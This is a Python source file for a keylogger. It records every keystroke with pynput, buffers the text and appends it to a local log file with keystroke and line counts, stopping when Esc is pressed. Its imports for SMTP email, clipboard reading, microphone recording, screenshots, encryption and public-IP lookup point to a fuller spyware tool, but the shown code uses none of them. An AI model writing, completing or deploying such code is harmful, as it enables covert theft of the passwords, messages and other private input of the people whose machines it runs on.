# libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket, platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time, os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

script_directory = os.path.dirname(os.path.abspath(__file__))
log_file_path = os.path.join(script_directory, "log.txt")

BUFFER_COUNT = 30
buffer = ""
keystroke_count = 0
line_count = 0
script_directory = os.path.dirname(os.path.abspath(__file__))
log_file_path = os.path.join(script_directory, "log.txt")

def on_press(key):
	global buffer, keystroke_count, line_count
	if hasattr(key, 'char'):
		buffer += str(key.char)
	elif key == Key.enter:
		buffer += "\n"
		line_count += 1
	elif key == Key.space:
		buffer += " "
	elif key == Key.backspace:
		buffer = buffer[:-1]
	keystroke_count += 1
	if keystroke_count > BUFFER_COUNT:
		write_log()

def info():
    return """\n\
=======================\n\
Text length : {0}\n\
No of keystrokes : {1}\n\
No of lines : {2}\n\
=======================\n""".format(len(buffer), keystroke_count,line_count + 1)

def write_log():
	global keystroke_count, line_count, buffer
	with open(log_file_path,"a") as out:
		out.write(buffer)
		out.write(info())
	buffer = ""
	keystroke_count = 0
	line_count = 0

def on_release(key):
	# break loop on pressing esc
	if key == Key.esc :
		write_log()
		return False

# what to do when a key is pressed and released respectively
with Listener(on_press = on_press, on_release = on_release) as listener:
	listener.join()